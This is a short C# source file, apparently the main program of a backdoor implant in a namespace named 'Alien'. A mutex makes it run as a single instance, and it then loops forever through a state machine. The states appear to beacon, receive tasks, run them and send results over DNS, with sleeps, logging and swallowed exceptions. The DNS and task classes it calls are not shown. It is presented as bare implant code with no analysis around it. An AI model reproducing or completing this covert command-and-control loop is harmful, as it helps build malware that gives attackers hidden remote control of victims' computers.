using System;
using System.Threading;

namespace Alien
{
	public class Program
	{
		private static void Main(string[] args)
		{
			bool flag;
			using (new Mutex(true, "rand-id-767223923742314124", out flag))
			{
				if (flag)
				{
					StateMachine stateMachine = new StateMachine();
					Config.Init();
					while (true)
					{
						try
						{
							Util.Log(string.Format("State : {0}", stateMachine.CurrentState));
							switch (stateMachine.CurrentState)
							{
								case MachineState.Begin:
									stateMachine.MoveNext(MachineCommand.Start);
									break;
								case MachineState.Sleep:
									stateMachine.MoveNext(Program._SleepAlive());
									break;
								case MachineState.Alive:
									stateMachine.MoveNext(DnsClass.Alive());
									break;
								case MachineState.Receive:
									stateMachine.MoveNext(DnsClass.Receive());
									break;
								case MachineState.Do:
									stateMachine.MoveNext(TaskClass.DoTask());
									break;
								case MachineState.Send:
									stateMachine.MoveNext(DnsClass.Send());
									break;
								case MachineState.SendAndReceive:
									stateMachine.MoveNext(DnsClass.SendAndReceive());
									break;
								case MachineState.SecondSleep:
									stateMachine.MoveNext(Program._SleepSecond());
									break;
							}
						}
						catch (Exception ex)
						{
							Util.Log(ex.ToString());
						}
					}
				}
			}
		}

		private static MachineCommand _SleepAlive()
		{
			Util.MakeDelay(2);
			Util.Log("SleepAlive : Start");
			return MachineCommand.Start;
		}

		private static MachineCommand _SleepSecond()
		{
			Util.MakeDelay(1);
			Util.Log("SleepSecond : Start");
			return MachineCommand.Start;
		}
	}
}
